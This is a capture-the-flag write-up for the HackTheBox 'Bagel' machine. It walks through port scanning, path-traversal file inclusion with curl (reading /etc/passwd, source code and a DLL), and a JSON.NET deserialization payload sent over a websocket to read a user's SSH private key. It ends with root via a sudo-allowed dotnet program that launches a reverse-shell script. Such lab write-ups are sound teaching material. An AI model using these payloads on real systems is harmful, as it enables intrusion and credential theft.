# HackTheBox - Bagel

## NMAP

```bash
Nmap scan report for 10.10.11.201                                                                                                                                                                                      
Host is up (0.29s latency).                                                                                                                                                                                                      
Not shown: 65519 closed tcp ports (reset)                                                                       
PORT      STATE    SERVICE  VERSION                                                                             
22/tcp    open     ssh      OpenSSH 8.8 (protocol 2.0)                                                          
| ssh-hostkey:                                                                                                  
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)                                                                
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)                                                              
5000/tcp  open     upnp?                                                                                        
| fingerprint-strings:                                                                                          
|   GetRequest:                                                                                                 
|     HTTP/1.1 400 Bad Request                                                                                  
|     Server: Microsoft-NetCore/2.0                                                                             
|     Date: Sun, 19 Feb 2023 15:46:30 GMT                                                                       
|     Connection: close                                                                                         
|   HTTPOptions:                                                                                                
|     HTTP/1.1 400 Bad Request                                                                                  
|     Server: Microsoft-NetCore/2.0                                                                             
|     Date: Sun, 19 Feb 2023 15:46:47 GMT                                                                       
|     Connection: close                                                                                         
|   Help:                                                                                                       
|     HTTP/1.1 400 Bad Request                                                                                  
|     Content-Type: text/html                                                                                   
|     Server: Microsoft-NetCore/2.0
|     Date: Sun, 19 Feb 2023 15:46:58 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
8000/tcp  open     http-alt Werkzeug/2.2.2 Python/3.10.9                                                        
| fingerprint-strings:                                                                                          
|   FourOhFourRequest:                                                                                          
|     HTTP/1.1 404 NOT FOUND                                                                                    
|     Server: Werkzeug/2.2.2 Python/3.10.9                                                                      
|     Date: Sun, 19 Feb 2023 15:46:31 GMT                                                                       
|     Content-Type: text/html; charset=utf-8                                                                    
|     Content-Length: 207                                                                                       
|     Connection: close                                                                                         
|     <!doctype html>                                                                                           
|     <html lang=en>               
|     <title>404 Not Found</title>       
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:       
|     HTTP/1.1 302 FOUND                                                                                        
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sun, 19 Feb 2023 15:46:25 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263          
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close 
|     <!doctype html>  
|     <html lang=en>  
|     <title>Redirecting...</title>                                                                             
|     <h1>Redirecting...</h1>            
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5:                  
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>            
|     <title>Error response</title>                                                                             
|     </head>                                                                                                   
|     <body>                                                                                                    
|     <h1>Error response</h1>                                                                                   
|     <p>Error code: 400</p>                                                                                    
|     <p>Message: Bad request syntax ('                                                                         
|     ').</p>                                                                                                   
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>         
|     </body>                                                                                                   
|_    </html>                                                                                                   
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html                                 
| http-methods:                                                                                                 
|_  Supported Methods: GET OPTIONS HEAD                                                                         
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9   
```

## PORT 8000 (HTTP)

The port redirects to bagel.htb, so adding that in hosts file

<img src="https://i.imgur.com/rXKIm5s.png"/>

Adding `bagel.htb` in `/etc/hosts`

<img src="https://i.imgur.com/2TiJHPC.png"/>
<img src="https://i.imgur.com/VoeYaIj.jpg"/>


Fuzzing for files and directories it didn't showed anything other than /orders

<img src="https://i.imgur.com/qksbhjO.png"/>

Orders didn't showed anything

<img src="https://i.imgur.com/fwNw2ls.png"/>

Trying for subdomain enumeration with `wfuzz`, it didn't showed any results as well

<img src="https://i.imgur.com/NrHAKfP.png"/>

## Foothold

If we go back to home page, we can see it's include an html page with `page` parameter, we can try testing for Local File Inclusion (LFI) here

```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://bagel.htb:8000/?page=FUZZ' --hw 3
```

<img src="https://i.imgur.com/SZmFFsl.png"/>

```bash
curl 'http://bagel.htb:8000/?page=../../../../../../../../../../../../../../../../etc/passwd'
```

<img src="https://i.imgur.com/UmdDlvC.png"/>

Since this is a flask application, we know that because of  `Werkzeug` running, so through LFI we can read `app.py` 

```bash
curl 'http://bagel.htb:8000/?page=../app.py
```

<img src="https://i.imgur.com/fP3UvqV.png"/>

Now the source code mentions about a dll file

<img src="https://i.imgur.com/3pa0Wyj.png"/>

So in order to find the dll, we need to brute force the process ID in `/proc/FUZZ/fd`

<img src="https://i.imgur.com/7tnrS6G.png"/>
First create a wordlist of numbers, I create a wordlist with `crunch`

```bash
crunch 1 3 1234567890 > numbers.txt
```

Next use wfuzz to fuzz for PIDs with the created wordlist

<img src="https://i.imgur.com/PeUU84N.png"/>

requests with 14 characters will show `file not found` so we need to look for requests having a different number of characters so by filtering on 0 and 14 characters I was able to find a request which was having the PID for dll

<img src="https://i.imgur.com/0gme010.png"/>

```bash
curl 'http://bagel.htb:8000/?page=../../../../../proc/887/cmdline' -so -
```

<img src="https://i.imgur.com/EoAIbhE.png"/>

Download the dll file through curl

```bash
curl 'http://bagel.htb:8000/?page=../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll' -o bagel.dll
```

<img src="https://i.imgur.com/msyRSOB.png"/>

Opening the dll file using ILSpy we can see some functions in the dll, it was quite overwhelming for me as it did took me sometime to understand what was happening here, we can find database credentials from `DB_Connection` method

<img src="https://i.imgur.com/kbEx6wb.png"/>

If we see the `Handler` class

<img src="https://i.imgur.com/eYlGeBI.png"/>

It is set to `4` which means it's set to AUTO, that can include .NET type which makes this vulnerable to JSON .NET deserizliation as configuration shouldn't be set to anything other than `None` 

<img src="https://i.imgur.com/UV0XIFJ.png"/>

Checking the `Orders` class we have `RemoveOrder` object having empty constructor which fulfils the requirement for this deserialization

<img src="https://i.imgur.com/wpW5OSq.png"/>

The application on `/orders` is using `ReadOrder` function which is filtering for reading local files as it's reading `orders.txt` from `/opt/bagel/orders/`

<img src="https://i.imgur.com/1wdjzm4.png"/>

<img src="https://i.imgur.com/fgLeIvm.png"/>
To perfrom json deserlization using RemoveOrder function our payload should like this 

```json
{"RemoveOrder":{"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../home/phil/.ssh/id_rsa"}}
```

Here `bagel_server.File` is the namespace and `File` is the parameter which will hold the file name in `ReadFile` and the reason we are using ReadFile function is because it won't have any validaiton and can directly read files

<img src="https://i.imgur.com/CLeMY5D.png"/>

Which then further calls `ReadContent`

<img src="https://i.imgur.com/fhFUju5.png"/>

On to sending our payload, we can use the same code which is in app.py 

```python
import websocket,json

ws = websocket.WebSocket() 
ws.connect("ws://10.10.11.201:5000/") # connect to order app
#order = {"ReadOrder":"orders.txt"}
order = {"RemoveOrder":{"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(json.loads(result))
```

<img src="https://i.imgur.com/MwauPmX.png"/>

<img src="https://i.imgur.com/7PVFE6v.png"/>

Having a shell as phil, we can then escalate to developer as we already had found the password 

## Privilege Escalation (developer)

<img src="https://i.imgur.com/loqWflx.png"/>

With `sudo -l` we can list what this user can run as root user

<img src="https://i.imgur.com/NtB9wfa.png"/>

## Privilege Escalation (root)

As a root user we can run dotnet application, so first creating a dotnet application with `dotnet console` which will then generate a cs and proj file, editing the cs file with 

```c#
System.Diagnostics.Process.Start("program","arguemnts");
```

<img src="https://i.imgur.com/Uh9B9bx.png"/>
Which is simply executing bash with a script `uwu.sh` having a reverse shell

<img src="https://i.imgur.com/FuBxeg2.png"/>

<img src="https://i.imgur.com/NxXHbcH.png"/>


## References

- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15
- https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm
